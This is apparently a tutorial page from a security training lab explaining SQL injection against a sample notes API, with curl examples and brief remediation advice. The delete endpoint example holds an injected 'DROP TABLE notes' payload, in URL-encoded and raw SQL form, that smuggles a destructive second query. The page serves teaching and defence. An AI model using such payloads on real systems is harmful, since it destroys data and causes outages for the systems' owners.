---
bookCollapseSection: false
---

# Anatomy of a Vulnerability

In this section we will create a SQL injection on vulnerable code, so that we
can perform malicious actions on the application. This shows how SQL injection
works, and explains how vulnerabilities in your application can be exploited and cause
harm to your organization.

## Exposing **Secret** data

In this example, I will show how to obtain data we shouldn't have access to.

1. Create a few notes via the GUI
2. Create some secret notes via the GUI
3. Get notes via API
4. Get Secret notes via SQL injection

## Deleting **Secret** data

In this example, I will show how to delete items from that we shouldn't
have access to.

First let's go over a standard flow. We can create some notes via the API:

```bash
$ curl -X POST http://{LOAD_BALANCER_IP}/{APPLICATION_PATH}/add -d '{"message": "ZAP"}'

{
  "Success": "Note added!"
}

$ curl -X POST http://{LOAD_BALANCER_IP}/{APPLICATION_PATH}/add -d '{"message": "YEET"}'

{
  "Success": "Note added!"
}
```

Now we can delete it with the DELETE api-call:

```bash
$ curl -X DELETE http://{LOAD_BALANCER_IP}/{APPLICATION_PATH}/delete\?id\=2
```

Now let's see what happens when a hacker üè¥‚Äç‚ò†Ô∏è tries to exploit this api
path and see if they can perform some malicious activity:

**Revealing Info**

**Service Outage**

```bash
$ curl -X DELETE http://{LOAD_BALANCER_IP}/{APPLICATION_PATH}/delete\?id\=1%3B%20DROP%20TABLE%20notes
```

The above also drops the notes table, causing information loss and downtime to the application. This can
be critical to a business function.

This means that in the UI, a user can simply add the following to drop the table:

```sql
1; DROP TABLE notes;
```

### Resolution

There are a few things we can do to resolve this:

1. Allow only one query to execute at a time

This functionality of executing multiple queries is not required by our application.
Therefore we should remove it. 

## Additional Considerations

1. Input Validation in Frontend
2. Input Validation in Backend